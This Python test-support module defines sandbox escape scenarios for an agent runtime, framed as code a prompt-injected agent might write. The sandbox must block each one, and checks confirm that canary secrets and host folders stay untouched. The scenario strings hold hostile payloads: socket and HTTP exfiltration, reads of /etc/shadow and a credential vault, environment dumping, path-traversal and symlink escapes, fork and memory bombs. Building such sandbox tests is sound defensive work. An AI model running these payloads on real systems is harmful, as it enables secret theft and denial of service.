"""Use case 12 attack scenarios: code a prompt-injected agent might write. Each must FAIL SAFELY in the sandbox.

Shared by run.py (the agent flow) and the per-backend tests (agentos/tests/test_sandbox_{wasm,docker}_3_5.py).
The "host" targets are a CANARY in a temporary folder made by the caller (never the real user's home or ~/.agentos).
"""

from __future__ import annotations

import os
import re
import socket
import threading
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

CANARY = "CANARY-host-secret-7f3a"
SECRET_ENV = "AGENTOS_UC12_CANARY_KEY"
KEYISH = re.compile(r"(API_KEY|SECRET|TOKEN|PASSWORD|AGENTOS_|OPENAI|ANTHROPIC|GROQ)", re.I)


class Listener:
    """A TCP listener on the host; any connection from the sandbox is an exfiltration (must stay 0)."""

    def __init__(self) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(8)
        self.sock.settimeout(0.2)
        self.port = self.sock.getsockname()[1]
        self.hits = 0
        self._stop = threading.Event()
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def _loop(self) -> None:
        while not self._stop.is_set():
            try:
                conn, _ = self.sock.accept()
                self.hits += 1
                conn.close()
            except OSError:
                continue

    def close(self) -> None:
        self._stop.set()
        self._t.join(timeout=2)
        self.sock.close()


@dataclass
class HostCtx:
    """Temporary host-side canaries (a fake home with ~/.agentos) and the exfiltration listener."""

    root: Path
    listener: Listener = field(default_factory=Listener)

    def __post_init__(self) -> None:
        self.home = self.root / "fake-host-home"
        (self.home / ".agentos").mkdir(parents=True, exist_ok=True)
        self.canary_file = self.home / ".agentos" / "vault.json"
        self.canary_file.write_text(CANARY, encoding="utf-8")
        self.outside_dir = self.root / "outside"
        self.outside_dir.mkdir(exist_ok=True)
        os.environ[SECRET_ENV] = CANARY  # present in the HOST environment; must never reach the sandbox

    def host_unchanged(self) -> bool:
        return (self.canary_file.read_text(encoding="utf-8") == CANARY and not any(self.outside_dir.iterdir())
                and not (self.root / "escape.txt").exists())

    def close(self) -> None:
        self.listener.close()
        os.environ.pop(SECRET_ENV, None)


def _no_canary(res: Any) -> bool:
    blob = res.stdout + res.stderr + "".join(v.decode("utf-8", "replace") for v in res.files_out.values())
    return CANARY not in blob


def scenarios(ctx: HostCtx) -> dict[str, tuple[str, str, Callable[[Any], tuple[bool, str]]]]:
    """name -> (kind, code, check(result) -> (safe, why))."""
    port = ctx.listener.port
    canary = ctx.canary_file.as_posix()
    outside = ctx.outside_dir.as_posix()

    def net(res: Any) -> tuple[bool, str]:
        ok = ctx.listener.hits == 0 and "CONNECTED" not in res.stdout
        return ok, f"listener connections: {ctx.listener.hits}; stdout has CONNECTED: {'CONNECTED' in res.stdout}"

    def host_read(res: Any) -> tuple[bool, str]:
        return _no_canary(res), "host canary not in any output" if _no_canary(res) else "CANARY LEAKED"

    def env(res: Any) -> tuple[bool, str]:
        keys = re.findall(r"'([A-Za-z_][A-Za-z0-9_]*)'", res.stdout)
        bad = [k for k in keys if KEYISH.search(k)]
        return (not bad and _no_canary(res)), f"keys seen: {sorted(keys)[:12]}; secret-like: {bad}"

    def outside_write(res: Any) -> tuple[bool, str]:
        return ctx.host_unchanged(), "host canary dir and outside dir unchanged" if ctx.host_unchanged() else "HOST CHANGED"

    def names(res: Any) -> tuple[bool, str]:
        from agentos.sandbox.paths import PathRefused, safe_rel_path

        try:
            for k in res.files_out:
                safe_rel_path(k)
        except PathRefused:
            return False, f"unsafe name accepted: {k!r}"
        return ctx.host_unchanged(), f"files out: {sorted(res.files_out)}; refused: {len(res.refused_files)}"

    def symlink(res: Any) -> tuple[bool, str]:
        linked = [k for k in res.files_out if k.startswith("link")]
        return (not linked and _no_canary(res)), f"link entries copied out: {linked}; refused: {res.refused_files[:3]}"

    def limited(*hits: str) -> Callable[[Any], tuple[bool, str]]:
        def check(res: Any) -> tuple[bool, str]:
            ok = res.limit_hit in hits or (res.exit_code not in (0, None) and "pids" in hits)
            return ok and ctx.host_unchanged(), f"limit_hit={res.limit_hit} exit={res.exit_code}"
        return check

    def output(res: Any) -> tuple[bool, str]:
        cap_ok = len(res.stdout.encode("utf-8")) <= 100 * 1024
        return cap_ok and res.limit_hit in ("output", "timeout"), (f"stdout kept {len(res.stdout)} chars, "
                                                                   f"limit_hit={res.limit_hit}")

    return {
        "network_exfiltration": ("python", (
            "import socket, urllib.request\n"
            "for host in ('127.0.0.1', 'host.docker.internal', '172.17.0.1'):\n"
            "    try:\n"
            "        s = socket.create_connection((host, %d), timeout=2); s.send(b'EXFIL'); print('CONNECTED', host)\n"
            "    except Exception as e:\n"
            "        print('socket blocked:', type(e).__name__)\n"
            "try:\n"
            "    urllib.request.urlopen('http://example.com/?d=EXFIL', timeout=3); print('CONNECTED http')\n"
            "except Exception as e:\n"
            "    print('http blocked:', type(e).__name__)\n") % port, net),
        "read_host_home": ("python", (
            "import os\n"
            "for p in [%r, os.path.expanduser('~/.agentos/vault.json'), '/root/.agentos/vault.json', '/etc/shadow']:\n"
            "    try:\n"
            "        print(p, open(p).read()[:80])\n"
            "    except Exception as e:\n"
            "        print('blocked', p, type(e).__name__)\n") % canary, host_read),
        "read_environment": ("python", "import os\nprint(sorted(os.environ))\n", env),
        "write_outside_workspace": ("python", (
            "import os\n"
            "for p in [%r, %r, '../escape.txt', '/escape.txt', '/etc/agentos-pwned', '/tmp/../escape.txt']:\n"
            "    try:\n"
            "        open(p, 'w').write('PWNED'); print('wrote', p)\n"
            "    except Exception as e:\n"
            "        print('blocked', p, type(e).__name__)\n") % (outside + "/pwned.txt", canary), outside_write),
        "path_traversal_names": ("python", (
            "import os\n"
            "for name in ['..\\\\evil.txt', 'a\\\\..\\\\..\\\\evil.txt', 'C:evil.txt', 'nul', 'x.txt:stream']:\n"
            "    try:\n"
            "        open(name, 'w').write('x'); print('made', repr(name))\n"
            "    except Exception as e:\n"
            "        print('blocked', repr(name), type(e).__name__)\n"
            "open('ok.txt', 'w').write('fine')\n"), names),
        "symlink_escape": ("python", (
            "import os\n"
            "for i, target in enumerate(['/', '/etc/passwd', %r, '..']):\n"
            "    try:\n"
            "        os.symlink(target, 'link%%d' %% i); print('linked', target)\n"
            "    except Exception as e:\n"
            "        print('blocked', target, type(e).__name__)\n") % canary, symlink),
        "fork_bomb": ("python", (
            "import os, time\n"
            "if not hasattr(os, 'fork'):\n"
            "    raise SystemExit('fork is not available here')\n"
            "kids = 0\n"
            "try:\n"
            "    while True:\n"
            "        if os.fork() == 0:\n"
            "            time.sleep(30); os._exit(0)\n"
            "        kids += 1\n"
            "except OSError as e:\n"
            "    print('fork stopped after', kids, type(e).__name__); raise SystemExit(3)\n"), limited("pids")),
        # pages are written (b'x' * n), so the memory is really used, not just reserved
        "memory_bomb": ("python", "x = []\nwhile True:\n    x.append(b'x' * (32 * 1024 * 1024))\n", limited("memory")),
        "infinite_loop": ("python", "while True:\n    pass\n", limited("timeout")),
        "huge_output": ("python", "import sys\nwhile True:\n    sys.stdout.write('A' * 65536)\n", output),
    }


SHELL_ONLY = {
    "shell_fork_bomb": ("shell", "f() { f | f & }; f; sleep 5", "pids"),
}
